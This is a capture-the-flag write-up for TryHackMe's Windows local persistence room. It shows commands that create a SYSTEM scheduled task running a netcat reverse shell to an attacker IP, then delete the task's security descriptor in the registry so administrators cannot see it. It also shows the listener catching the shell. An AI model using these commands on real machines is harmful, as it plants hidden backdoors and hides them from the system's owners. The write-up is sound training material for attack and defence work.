# About This Module
Module link: https://tryhackme.com/room/windowslocalpersistence

**Please feel free to point out any errors that you may see in this writeup!**

This writeup was last updated: 07/06/2023

# Task Scheduler
1. Started this room's machine
2. `schtasks /create /sc <FREQUENCY TYPE> /mo <FREQUENCY> /tn <TASK NAME> /tr "<NETCAT LOCATION> -e cmd.exe <ATTACK MACHINE IP> <PORT NUMBER>" /ru <USER ACCOUND>` from the compromised Windows machine to create and run a new scheduled task that'll try creating a reverse shell by attempting to connect to a netcat listener on our attack machine at the specified port in a specified frequency 
```PowerShell
C:\Users\Administrator>schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.10.39.232 9999" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```
3. `schtasks /query /tn <TASK NAME>` from the compromised Windows machine to retrieve and display onto our terminal the details of the task that we just created to verify that our task is running as intended, which it was 
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
THM-taskbackdoor                         7/7/2023 12:54:00 AM   Ready
```
4. `c:\tools\pstools\PsExec64.exe -s -i regedit` from the compromised Windows machine to run the Windows Registry Editor with elevated privileges and in the context of the SYSTEM account, which will allow us to delete our created task's Security Descriptor (**SD**) that's located in the **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree** registry, which will end up making it invisble to any user in the system since deleting a task's SD is equivalent to disallowing all users' access to the scueduled task, including administrators
```PoweShell
C:\Users\Administrator>c:\tools\pstools\PsExec64.exe -s -i regedit

PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich
Sysinternals - www.sysinternals.com
```

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/PsExec64.exe%20-s%20-i%20regedit.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Registry%20Editor%20After%20Delete%20HKLM%20SOFTWARE%20Microsoft%20Windows%20NT%20CurrentVersion%20Schedule%20TaskCache%20Tree.png)

5. `schtasks /query /tn <TASK NAME>` from the compromised Windows machine to retrieve and display onto our terminal the details of the task that we just created to see if it's now hidden after deleting its SD, which it was since our system couldn't find the task 
```PowerShell
C:\Users\Administrator>schtasks /query /tn THM-taskbackdoor
ERROR: The system cannot find the file specified.
```
6. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to open up a netcat listener to listen for any inbound connections, which ended up receiving a reverse shell connection that was spawned in by the scheduled task we created on the compromised Windows machine
```Bash
root@ip-10-10-39-232:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from 10.10.61.182 49841 received!
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
7. `C:\flags\flag9.exe` from our reverse shell to run the **flag9.exe** program, which ended up displaying this task's flag onto our terminal
```PowerShell
C:\Windows\system32>C:\flags\flag9.exe
C:\flags\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```

**TASK COMPLETED**
